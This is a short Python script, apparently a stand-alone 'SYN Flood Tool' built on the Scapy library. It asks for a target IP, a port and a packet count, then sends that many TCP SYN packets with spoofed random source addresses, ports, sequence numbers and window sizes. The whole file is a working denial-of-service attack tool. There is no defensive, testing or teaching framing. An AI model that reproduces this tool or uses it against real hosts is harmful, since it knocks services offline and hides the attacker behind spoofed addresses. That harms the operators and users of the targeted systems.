from scapy.all import *
import os
import sys
import random

def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def rand_int():
    return random.randint(1000, 9000)

def syn_flood(dst_ip, dst_port, counter):
    total = 0
    print("Packets are sending ...")
    for _ in range(counter):
        s_port = rand_int()
        s_eq = rand_int()
        w_indow = rand_int()

        ip_packet = IP(src=random_ip(), dst=dst_ip)
        tcp_packet = TCP(sport=s_port, dport=dst_port, flags="S", seq=s_eq, window=w_indow)

        send(ip_packet / tcp_packet, verbose=0)
        total += 1

    print(f"\nTotal packets sent: {total}\n")

def get_info():
    os.system("clear")
    print("#############################")
    print("# Welcome to SYN Flood Tool #")
    print("#############################")

    dst_ip = input("\nTarget IP : ")
    dst_port = int(input("Target Port : "))
    
    return dst_ip, dst_port

def main():
    dst_ip, dst_port = get_info()
    counter = int(input("How many packets do you want to send : "))
    syn_flood(dst_ip, dst_port, counter)

if __name__ == "__main__":
    main()
